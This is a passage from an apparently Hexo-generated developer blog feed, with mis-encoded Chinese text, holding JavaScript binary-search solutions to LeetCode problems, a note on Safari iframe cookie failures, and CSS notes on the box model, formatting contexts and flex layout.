class="comment">// lowerä¸ºfalseæ—¶ï¼Œæ‰¾æœ€åä¸€ä¸ªä½ç½®, nums[mid] === target, è®©leftå¾€ä¸ŠåŠ ï¼Œæœ€åæ‰¾åˆ°å¤§äºtargetçš„ç´¢å¼•</span></span><br><span class="line">    <span class="keyword">if</span> (nums[mid] &gt; target || (lower &amp;&amp; nums[mid] &gt;= target))  &#123;</span><br><span class="line">      ans = mid</span><br><span class="line">      right = mid - <span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      left = mid + <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> searchRange = <span class="function">(<span class="params">nums, target</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> ans = [<span class="number">-1</span>, <span class="number">-1</span>]</span><br><span class="line">  <span class="keyword">const</span> leftIdx = binarySearch(nums, target, <span class="literal">true</span>)</span><br><span class="line">  <span class="keyword">const</span> rightIdx = binarySearch(nums, target, <span class="literal">false</span>) - <span class="number">1</span></span><br><span class="line">  <span class="keyword">if</span> (nums[leftIdx] === target &amp;&amp; nums[rightIdx] === target &amp;&amp; leftIdx &gt;= <span class="number">0</span> &amp;&amp; rightIdx &lt; nums.length) &#123;</span><br><span class="line">    ans = [leftIdx, rightIdx]</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h5 id="LeetCode-69-xçš„å¹³æ–¹æ ¹"><a href="#LeetCode-69-xçš„å¹³æ–¹æ ¹" class="headerlink" title="LeetCode 69.xçš„å¹³æ–¹æ ¹"></a>LeetCode 69.xçš„å¹³æ–¹æ ¹</h5><p>è®¡ç®—å¹¶è¿”å› x çš„å¹³æ–¹æ ¹ï¼Œå…¶ä¸­ x æ˜¯éè´Ÿæ•´æ•°ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æŸ¥æ‰¾è¿‘ä¼¼é—®é¢˜</span></span><br><span class="line"><span class="comment">// y = x ^ 2, x &gt; 0æ—¶ï¼ŒæŠ›ç‰©çº¿åœ¨yè½´å³ä¾§å•è°ƒé€’å¢ï¼Œä¸”æœ‰ä¸Šä¸‹ç•Œ</span></span><br><span class="line"><span class="keyword">var</span> mySqrt = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (x === <span class="number">0</span> || x === <span class="number">1</span>) <span class="keyword">return</span> x</span><br><span class="line">  <span class="keyword">let</span> left = <span class="number">1</span>, right = x, mid = <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">    <span class="comment">// &gt;&gt; 1 ä½è¿ç®—ä»£æ›¿ é™¤2 å–æ•´ æ“ä½œ</span></span><br><span class="line">    mid = left + ((right - left) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> (mid * mid === x) &#123;</span><br><span class="line">      <span class="keyword">return</span> mid</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mid * mid &gt; x) &#123;</span><br><span class="line">      right = mid - <span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      left = mid + <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> right</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Safari é‡Œçš„ iframeï¼ŒSet-Cookieä¼šå¤±è´¥</title>
      <link href="/2021/08/16/cookie%E4%BF%9D%E5%AD%98%E5%A4%B1%E8%B4%A5/"/>
      <url>/2021/08/16/cookie%E4%BF%9D%E5%AD%98%E5%A4%B1%E8%B4%A5/</url>
      <content type="html"><![CDATA[<p>Safari çš„å®‰å…¨ç­–ç•¥å¤ªä¸¥æ ¼äº†ï¼Œiframe åµŒå¥—çš„ç½‘ç«™çš„ cookie è¢«è®¤ä¸ºæ˜¯ä¸å®‰å…¨çš„ï¼Œå› æ­¤ä¸å…è®¸ä¿å­˜ï¼Œè¿™å°±å¯¼è‡´äº†ç”¨æˆ·å³ä½¿åœ¨ iframe ä¸­ç™»å½•äº†ç½‘ç«™ï¼Œä¹Ÿæ— æ³•ä¿æŒç™»å½•çŠ¶æ€ï¼Œæ¯æ¬¡è·³è½¬é¡µé¢ä¹‹åå°±éœ€è¦é‡æ–°ç™»å½•ã€‚</p><p>è§£å†³æ–¹æ³•ï¼š<br>å¼ºè¡ŒæŠŠ iframe çš„çˆ¶çº§é¡µé¢è·³è½¬åˆ°å­é¡µé¢æ‰€åœ¨çš„ç½‘ç«™ï¼Œè·³è½¬æ—¶æºå¸¦ç™»å½•ä¿¡æ¯ï¼Œåç«¯è®¾ç½®å¥½ cookie åï¼Œå†é‡å®šå‘åˆ°çˆ¶çº§é¡µé¢ï¼Œè¿™æ—¶å€™è®¾ç½®çš„ cookie å°±è¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„äº†ã€‚</p>]]></content>
      
      <categories>
          
          <category> Bug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ç›’æ¨¡å‹ã€æ­£å¸¸æµã€flexã€ç§»åŠ¨ç«¯é€‚é…</title>
      <link href="/2021/08/16/%E7%9B%92%E6%A8%A1%E5%9E%8B/"/>
      <url>/2021/08/16/%E7%9B%92%E6%A8%A1%E5%9E%8B/</url>
      <content type="html"><![CDATA[<h3 id="1-ç›’æ¨¡å‹"><a href="#1-ç›’æ¨¡å‹" class="headerlink" title="1. ç›’æ¨¡å‹"></a>1. ç›’æ¨¡å‹</h3><p>HTMLæ ‡ç­¾ä¸­å¯ä»¥ä¹¦å†™å¼€å§‹æ ‡ç­¾ã€ç»“æŸæ ‡ç­¾å’Œè‡ªå°é—­æ ‡ç­¾ã€‚ä¸€å¯¹èµ·æ­¢æ ‡ç­¾ï¼Œè¡¨ç¤ºä¸€ä¸ªå…ƒç´ ã€‚DOMæ ‘ä¸­å­˜å‚¨çš„æ˜¯å…ƒç´ å’Œå…¶ä»–ç±»å‹çš„èŠ‚ç‚¹ã€‚CSSé€‰æ‹©å™¨é€‰ä¸­çš„æ˜¯<em>å…ƒç´ </em>ã€‚</p><p>å…ƒç´ åœ¨æ’ç‰ˆæ—¶å¯èƒ½äº§ç”Ÿå¤šä¸ª<em>ç›’</em>ã€‚æ’ç‰ˆå’Œæ¸²æŸ“çš„åŸºæœ¬å•ä½æ˜¯<em>ç›’</em>ã€‚ä¸€ä¸ªå…ƒç´ å¯èƒ½ä¼šäº§ç”Ÿå¤šä¸ªç›’ã€‚å¦‚<em>inline</em>å…ƒç´ å› ä¸ºåˆ†è¡Œè€Œäº§ç”Ÿå¤šä¸ªç›’ã€‚<em>è¢«ä¼ªå…ƒç´ é€‰ä¸­çš„å…ƒç´ </em>ä¹Ÿä¼šäº§ç”Ÿå¤šä¸ªç›’ã€‚</p><p>æ¯ä¸ªå…ƒç´ è¢«è¡¨ç¤ºä¸ºä¸€ä¸ªçŸ©å½¢çš„æ–¹æ¡†ï¼Œæ¡†çš„å†…å®¹ã€å†…è¾¹è·ã€è¾¹ç•Œã€å¤–è¾¹è·ä¸€å±‚å±‚æ„å»ºèµ·æ¥ã€‚æµè§ˆå™¨æ¸²æŸ“ç½‘é¡µå¸ƒå±€æ—¶ï¼Œä¼šç®—å‡ºæ¯ä¸ªæ¡†æ¯ä¸€å±‚è¦ç”¨ä»€ä¹ˆæ ·å¼ï¼Œä»¥åŠæ¡†æ”¾åœ¨å“ªé‡Œã€‚<br><em><code>box-sizing</code></em></p><ul><li>content-boxï¼š<code>element width = border + padding + content width</code></li><li>border-boxï¼š<code>element width = content width</code>(å†…å®¹å®½åº¦åŒ…å«äº†content widthï¼Œborder, padding, å»ºè®®ä½¿ç”¨)</li></ul><p><br></p><h3 id="2-æ­£å¸¸æµï¼ŒBFCï¼ŒIFC"><a href="#2-æ­£å¸¸æµï¼ŒBFCï¼ŒIFC" class="headerlink" title="2. æ­£å¸¸æµï¼ŒBFCï¼ŒIFC"></a>2. æ­£å¸¸æµï¼ŒBFCï¼ŒIFC</h3><p>HTMLæœ€æ—©çš„æ’ç‰ˆè®¾è®¡ï¼Œä»æ–‡å­—å‡ºç‰ˆè¡Œä¸šçš„ä¸“å®¶æ¥åšã€‚æ€è€ƒä¸€ä¸‹ï¼Œæˆ‘ä»¬å¦‚ä½•å†™å­—ï¼Ÿ1.ä»å·¦åˆ°å³ä¹¦å†™ï¼› 2. åŒä¸€è¡Œå†™çš„æ–‡å­—éƒ½æ˜¯å¯¹é½çš„ï¼›3. ä¸€è¡Œå†™æ»¡äº†ï¼Œå°±æ¢åˆ°ä¸‹ä¸€è¡Œã€‚<strong>è¿™ä¹Ÿå¯¹åº”äº†æ­£å¸¸æµæ’ç‰ˆè¿‡ç¨‹:</strong></p><ol><li>æ”¶é›†ç›’</li><li>è®¡ç®—ç›’åœ¨è¡Œä¸­çš„æ’å¸ƒ<ul><li>è¡Œå†…ç›’éµå¾ª<em>IFC</em>(inline formatting contexts) å†…è”æ ¼å¼ä¸Šä¸‹æ–‡<br>ä»å·¦åˆ°å³æ’åˆ—ï¼Œæ’ä¸ä¸‹ï¼Œæ”¾ä¸‹ä¸€è¡Œã€‚BaselineåŸºçº¿æ¥å†³å®šè¡Œå†…å…ƒç´ å¦‚ä½•å¯¹é½ã€‚</li><li>å—çŠ¶ç›’éµå¾ª<em>BFC</em>(Block formatting contexts) å—çº§æ ¼å¼ä¸Šä¸‹æ–‡<br>ä»ä¸Šåˆ°ä¸‹ä¾æ¬¡æ’å¸ƒã€‚BFCåˆå¹¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ<ul><li><em>clear float</em><br>å…¶å®ä¸æ˜¯æ¸…æ¥šæµ®åŠ¨çš„æ„æ€ï¼Œè€Œæ˜¯æ‰¾ä¸€ä¸ªå¹²å‡€çš„ç©ºé—´æ¥æ‰§è¡Œæµ®åŠ¨ã€‚é¿å…å¤šä¸ªç›¸é‚»çš„æµ®åŠ¨å…ƒç´ å †å åœ¨ä¸€è¡Œ</li><li><em>margunæŠ˜å </em><br>åªæ˜¯è¦æ±‚å‘¨å›´æœ‰è¿™ä¹ˆå¤šçš„ç©ºç™½ï¼Œå°±æ˜¯ä¸€ä¸ªåˆç†çš„æ’ç‰ˆã€‚è€Œä¸ä¼šè¯´è·Ÿåˆ«çš„è¾¹è·ä¹Ÿæœ‰è¿™ä¹ˆå¤šç©ºç™½ã€‚åªæœ‰æ­£å¸¸æµçš„BFCä¼šå‘ç”ŸmarginæŠ˜å çš„ç°è±¡ï¼Œå…¶ä»–flexç­‰å¸ƒå±€ä¸ä¼šå‘ç”Ÿã€‚</li></ul></li></ul></li><li>è®¡ç®—è¡Œçš„æ’å¸ƒ</li></ol><p><br></p><h3 id="3-flex"><a href="#3-flex" class="headerlink" title="3. flex"></a>3. flex</h3><p>flex å®¹å™¨ä¸­é»˜è®¤å­˜åœ¨ä¸¤æ¡è½´ï¼š</p><ul><li>æ°´å¹³ä¸»è½´ main axis</li><li>å‚ç›´äº¤å‰è½´ cross axis</li></ul><p><img src="/2021/08/16/ç›’æ¨¡å‹/1.jpg"><br>åœ¨å®¹å™¨ä¸­çš„æ¯ä¸ªå•å…ƒå—è¢«ç§°ä¹‹ä¸º flex itemï¼Œæ¯ä¸ªé¡¹ç›®å æ®çš„ä¸»è½´ç©ºé—´ä¸º (main size), å æ®çš„äº¤å‰è½´çš„ç©ºé—´ä¸º (cross size)ã€‚ä¸èƒ½å…ˆå…¥ä¸ºä¸»è®¤ä¸ºå®½åº¦å°±æ˜¯ main sizeï¼Œé«˜åº¦å°±æ˜¯ cross sizeï¼Œå–å†³äº<code>flex-direction</code>çš„å–å€¼ï¼‰</p><p><br></p><h4 id="3-1-flex-å®¹å™¨"><a href="#3-1-flex-å®¹å™¨" class="headerlink" title="3.1 flex å®¹å™¨"></a>3.1 flex å®¹å™¨</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex | inline-flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¾ç½® flex å¸ƒå±€åï¼Œå­å…ƒç´ çš„ floatã€clearã€vertical-align çš„å±æ€§å°†ä¼šå¤±æ•ˆã€‚</p><p>æœ‰ä¸‹é¢å…­ç§å±æ€§å¯ä»¥è®¾ç½®åœ¨å®¹å™¨ä¸Šï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ï¼š</p><ol><li>flex-directionï¼šå†³å®šä¸»è½´çš„æ–¹å‘ row | row-reverse | column | column-reverse</li><li>flex-wrapï¼šå†³å®šå®¹å™¨å†…itemæ˜¯å¦å¯æ¢è¡Œ nowrap(ä¸æ¢è¡Œ) | wrap | wrap-reverse(æ¢è¡Œï¼Œç¬¬ä¸€è¡Œåœ¨ä¸‹æ–¹)</li><li>flex-flowï¼šflex-direction å’Œ flex-wrap çš„ç®€å†™å½¢å¼ï¼Œé»˜è®¤å€¼ä¸º: row nowrap</li><li>justify-contentï¼šitemåœ¨ä¸»è½´çš„å¯¹é½æ–¹å¼ flex-start | flex-end | center | space-between | space-around</li><li>align-itemsï¼šitemåœ¨äº¤å‰è½´ä¸Šçš„å¯¹é½æ–¹å¼ï¼Œé»˜è®¤å€¼ä¸º stretchï¼Œå³å¦‚æœé¡¹ç›®æœªè®¾ç½®é«˜åº¦æˆ–è€…è®¾ä¸º autoï¼Œå°†å æ»¡æ•´ä¸ªå®¹å™¨çš„é«˜åº¦ã€‚flex-start | flex-end | center | baseline(é¡¹ç›®çš„ç¬¬ä¸€è¡Œæ–‡å­—çš„åŸºçº¿å¯¹é½) | stretch</li><li>align-contentï¼šç¡®å®šå®¹å™¨ä¸­å­˜åœ¨å¤šè¡Œæƒ…å†µä¸‹ï¼Œåœ¨äº¤å‰è½´ä¸Šï¼Œè¡Œé—´å¯¹é½æ–¹å¼ã€‚é»˜è®¤å€¼ä¸º stretchï¼Œå¦‚æœé¡¹ç›®åªæœ‰ä¸€æ ¹è½´çº¿ï¼Œé‚£ä¹ˆè¯¥å±æ€§å°†ä¸èµ·ä½œç”¨ flex-start | flex-end | center | space-between | space-around | stretch<ul><li>å½“ flex-wrap è®¾ç½®ä¸º nowrap çš„æ—¶å€™ï¼Œå®¹å™¨ä»…å­˜åœ¨ä¸€æ ¹è½´çº¿ï¼Œå› ä¸ºé¡¹ç›®ä¸ä¼šæ¢è¡Œï¼Œå°±ä¸ä¼šäº§ç”Ÿå¤šæ¡è½´çº¿ã€‚</li><li>å½“ flex-wrap è®¾ç½®ä¸º wrap çš„æ—¶å€™ï¼Œå®¹å™¨å¯èƒ½ä¼šå‡ºç°å¤šæ¡è½´çº¿ï¼Œè¿™æ—¶å€™ä½ å°±éœ€è¦å»è®¾ç½®å¤šæ¡è½´çº¿ä¹‹é—´çš„å¯¹é½æ–¹å¼äº†ã€‚</li></ul></li></ol><p><br></p><h4 id="3-2-flex-itemå±æ€§"><a href="#3-2-flex-itemå±æ€§" class="headerlink" title="3.2 flex itemå±æ€§"></a>3.2 flex itemå±æ€§</h4><p>æœ‰å…­ç§å±æ€§å¯è¿ç”¨åœ¨ item é¡¹ç›®ä¸Šï¼š</p><ol><li>orderï¼šé¡¹ç›®åœ¨å®¹å™¨ä¸­çš„æ’åˆ—é¡ºåºï¼Œæ•°å€¼è¶Šå°ï¼Œæ’åˆ—è¶Šé å‰ï¼Œé»˜è®¤å€¼ä¸º 0ï¼Œå¯ä¸ºè´Ÿæ•°</li><li>flex-basisï¼šåœ¨åˆ†é…å¤šä½™ç©ºé—´ä¹‹å‰ï¼Œé¡¹ç›®å æ®çš„ä¸»è½´ç©ºé—´ï¼Œæµè§ˆå™¨æ ¹æ®è¿™ä¸ªå±æ€§ï¼Œè®¡ç®—ä¸»è½´æ˜¯å¦æœ‰å¤šä½™ç©ºé—´ï¼Œé»˜è®¤ä¸º autoï¼Œå³é¡¹ç›®æœ¬æ¥çš„å¤§å°, è¿™æ—¶å€™ item çš„å®½é«˜å–å†³äº width æˆ– height çš„å€¼ã€‚<ul><li>å½“ä¸»è½´ä¸ºæ°´å¹³æ–¹å‘çš„æ—¶å€™ï¼Œå½“è®¾ç½®äº† flex-basisï¼Œé¡¹ç›®çš„å®½åº¦è®¾ç½®å€¼ä¼šå¤±æ•ˆï¼Œflex-basis éœ€è¦è·Ÿ flex-grow å’Œ flex-shrink é…åˆä½¿ç”¨æ‰èƒ½å‘æŒ¥æ•ˆæœã€‚</li></ul></li><li>flex-growï¼šé¡¹ç›®çš„æ”¾å¤§æ¯”ä¾‹ï¼Œé»˜è®¤å€¼ä¸º 0ï¼Œå³å¦‚æœå­˜åœ¨å‰©ä½™ç©ºé—´ï¼Œä¹Ÿä¸æ”¾å¤§ã€‚<br>å½“æ‰€æœ‰çš„é¡¹ç›®éƒ½ä»¥ flex-basis çš„å€¼è¿›è¡Œæ’åˆ—åï¼Œä»æœ‰å‰©ä½™ç©ºé—´ï¼Œé‚£ä¹ˆè¿™æ—¶å€™ flex-grow å°±ä¼šå‘æŒ¥ä½œç”¨äº†ã€‚</li><li>flex-shrinkï¼šé¡¹ç›®çš„ç¼©å°æ¯”ä¾‹ï¼Œé»˜è®¤å€¼ä¸º 1ï¼Œå³å¦‚æœç©ºé—´ä¸è¶³ï¼Œè¯¥é¡¹ç›®å°†ç¼©å°ï¼Œè´Ÿå€¼å¯¹è¯¥å±æ€§æ— æ•ˆã€‚</li><li>flexï¼šflex-grow, flex-shrink å’Œ flex-basis çš„ç®€å†™ï¼Œé»˜è®¤å€¼æ˜¯ 0 1 autoã€‚<br>æœ‰å…³å¿«æ·å€¼ï¼šauto (1 1 auto) å’Œ none (0 0 auto)</li><li>align-selfï¼šå…è®¸å•ä¸ªé¡¹ç›®æœ‰ä¸å…¶ä»–é¡¹ç›®ä¸ä¸€æ ·çš„å¯¹é½æ–¹å¼ï¼Œé»˜è®¤å€¼ä¸º autoï¼Œè¡¨ç¤ºç»§æ‰¿çˆ¶å…ƒç´ çš„ align-items å±æ€§ï¼Œå¦‚æœæ²¡æœ‰çˆ¶å…ƒç´ ï¼Œåˆ™ç­‰åŒäº stretchã€‚auto | flex-start | flex-end | center | baseline | stretch</li></ol><p><br></p><h4 id="3-3-flex-ç®€å†™"><a href="#3-3-flex-ç®€å†™" class="headerlink" title="3.3 flex ç®€å†™"></a>3.3 flex ç®€å†™</h4><p><em>å…¬å¼ï¼š</em></p><ul><li>x éè´Ÿæ—¶ï¼Œflex: x â†’ flex: x 1 0%</li><li>x ä¸ºé•¿åº¦(px)æˆ–ç™¾åˆ†æ¯”æ—¶ï¼Œflex: x â†’ flex: 1 1 x</li><li>x å’Œ y éƒ½éè´Ÿæ—¶ï¼Œflex: x y â†’ flex: x y 0%</li><li>x éè´Ÿæ•°å­—ã€y æ˜¯ä¸€ä¸ªé•¿åº¦æˆ–ç™¾åˆ†æ¯”æ—¶ï¼Œflex: x y â†’ flex: x 1 y</li></ul><p><em>ä¸¾ä¾‹ï¼š</em><br>å½“ flex å–å€¼ä¸ºä¸€ä¸ªéè´Ÿæ•°å­—ï¼Œåˆ™è¯¥æ•°å­—ä¸º flex-grow å€¼ï¼Œflex-shrink å– 1ï¼Œflex-basis å– 0%ï¼Œå¦‚ä¸‹æ˜¯ç­‰åŒçš„ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;<span class="attribute">flex</span>: <span class="number">1</span>;&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">0%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ flex å–å€¼ä¸º 0 æ—¶ï¼Œå¯¹åº”çš„ä¸‰ä¸ªå€¼åˆ†åˆ«ä¸º 0 1 0%ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;<span class="attribute">flex</span>: <span class="number">0</span>;&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">0%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ flex å–å€¼ä¸ºä¸€ä¸ªé•¿åº¦æˆ–ç™¾åˆ†æ¯”ï¼Œåˆ™è§†ä¸º flex-basis å€¼ï¼Œflex-grow å– 1ï¼Œflex-shrink å– 1ï¼Œæœ‰å¦‚ä¸‹ç­‰åŒæƒ…å†µï¼ˆæ³¨æ„ 0% æ˜¯ä¸€ä¸ªç™¾åˆ†æ¯”è€Œä¸æ˜¯ä¸€ä¸ªéè´Ÿæ•°å­—ï¼‰ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item-1</span> &#123;<span class="attribute">flex</span>: <span class="number">0%</span>;&#125;</span><br><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">0%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.item-2</span> &#123;<span class="attribute">flex</span>: <span class="number">24px</span>;&#125;</span><br><span class="line"><span class="selector-class">.item-2</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">24px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ flex å–å€¼ä¸ºä¸¤ä¸ªéè´Ÿæ•°å­—ï¼Œåˆ™åˆ†åˆ«è§†ä¸º flex-grow å’Œ flex-shrink çš„å€¼ï¼Œflex-basis å– 0%ï¼Œå¦‚ä¸‹æ˜¯ç­‰åŒçš„ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;<span class="attribute">flex</span>: <span class="number">2</span> <span class="number">3</span>;&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">3</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">0%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ flex å–å€¼ä¸ºä¸€ä¸ªéè´Ÿæ•°å­—å’Œä¸€ä¸ªé•¿åº¦æˆ–ç™¾åˆ†æ¯”ï¼Œåˆ™åˆ†åˆ«è§†ä¸º flex-grow å’Œ flex-basis çš„å€¼ï¼Œflex-shrink å– 1ï¼Œå¦‚ä¸‹æ˜¯ç­‰åŒçš„ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;<span class="attribute">flex</span>: <span class="number">11</span> <span class="number">32px</span>;&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">11</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">32px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>grow å’Œ shrink æ˜¯ä¸€å¯¹åŒèƒèƒï¼Œgrow è¡¨ç¤ºä¼¸å¼ å› å­ï¼Œshrink è¡¨ç¤ºæ˜¯æ”¶ç¼©å› å­ã€‚shrink åœ¨ flex å®¹å™¨ä¸‹çš„å­å…ƒç´ çš„å®½åº¦æ€»å’Œæ¯”å®¹å™¨å°çš„æ—¶å€™èµ·ä½œç”¨ã€‚ grow å®šä¹‰äº†å­å…ƒç´ çš„å°ºå¯¸å¢é•¿å› å­ï¼Œå®¹å™¨ä¸­é™¤å»å­å…ƒç´ ä¹‹å’Œå‰©ä¸‹çš„å°ºå¯¸ä¼šæŒ‰ç…§å„ä¸ªå­å…ƒç´ çš„ grow å€¼è¿›è¡Œå¹³åˆ†åŠ å¤§å„ä¸ªå­å…ƒç´ ä¸Šã€‚</p><p><br></p><h4 id="3-4-flex-wrapã€flex-shrinkã€flex-growçš„å…³ç³»"><a href="#3-4-flex-wrapã€flex-shrinkã€flex-growçš„å…³ç³»" class="headerlink" title="3.4 flex-wrapã€flex-shrinkã€flex-growçš„å…³ç³»"></a>3.4 flex-wrapã€flex-shrinkã€flex-growçš„å…³ç³»</h4><p>å®¹å™¨çš„ flex-wrap ä¸å­é¡¹çš„ flex-shrinkã€flex-grow ä¹‹é—´çš„å…³ç³»</p><ol><li>å½“ flex-wrap ä¸º wrap | wrap-reverseï¼Œä¸”å­é¡¹å®½åº¦å’Œä¸åŠçˆ¶å®¹å™¨å®½åº¦æ—¶ï¼Œflex-grow ä¼šèµ·ä½œç”¨ï¼Œå­é¡¹ä¼šæ ¹æ® flex-grow è®¾å®šçš„å€¼æ”¾å¤§ï¼ˆä¸º0çš„é¡¹ä¸æ”¾å¤§ï¼‰</li><li>å½“ flex-wrap ä¸º wrap | wrap-reverseï¼Œä¸”å­é¡¹å®½åº¦å’Œè¶…è¿‡çˆ¶å®¹å™¨å®½åº¦æ—¶ï¼Œé¦–å…ˆä¸€å®šä¼šæ¢è¡Œï¼Œæ¢è¡Œåï¼Œæ¯ä¸€è¡Œçš„å³ç«¯éƒ½å¯èƒ½ä¼šæœ‰å‰©ä½™ç©ºé—´ï¼ˆæœ€åä¸€è¡ŒåŒ…å«çš„å­é¡¹å¯èƒ½æ¯”å‰å‡ è¡Œå°‘ï¼Œæ‰€ä»¥å‰©ä½™ç©ºé—´å¯èƒ½ä¼šæ›´å¤§ï¼‰ï¼Œè¿™æ—¶ flex-grow ä¼šèµ·ä½œç”¨ï¼Œè‹¥å½“å‰è¡Œæ‰€æœ‰å­é¡¹çš„ flex-grow éƒ½ä¸º0ï¼Œåˆ™å‰©ä½™ç©ºé—´ä¿ç•™ï¼Œè‹¥å½“å‰è¡Œå­˜åœ¨ä¸€ä¸ªå­é¡¹çš„ flex-grow ä¸ä¸º0ï¼Œåˆ™å‰©ä½™ç©ºé—´ä¼šè¢« flex-grow ä¸ä¸º0çš„å­é¡¹å æ®</li><li>å½“ flex-wrap ä¸º nowrapï¼Œä¸”å­é¡¹å®½åº¦å’Œä¸åŠçˆ¶å®¹å™¨å®½åº¦æ—¶ï¼Œflex-grow ä¼šèµ·ä½œç”¨ï¼Œå­é¡¹ä¼šæ ¹æ® flex-grow è®¾å®šçš„å€¼æ”¾å¤§ï¼ˆä¸º0çš„é¡¹ä¸æ”¾å¤§ï¼‰</li><li>å½“ flex-wrap ä¸º nowrapï¼Œä¸”å­é¡¹å®½åº¦å’Œè¶…è¿‡çˆ¶å®¹å™¨å®½åº¦æ—¶ï¼Œflex-shrink ä¼šèµ·ä½œç”¨ï¼Œå­é¡¹ä¼šæ ¹æ® flex-shrink è®¾å®šçš„å€¼è¿›è¡Œç¼©å°ï¼ˆä¸º0çš„é¡¹ä¸ç¼©å°ï¼‰ã€‚ä½†è¿™é‡Œæœ‰ä¸€ä¸ªè¾ƒä¸ºç‰¹æ®Šæƒ…å†µï¼Œå°±æ˜¯å½“è¿™ä¸€è¡Œæ‰€æœ‰å­é¡¹ flex-shrink 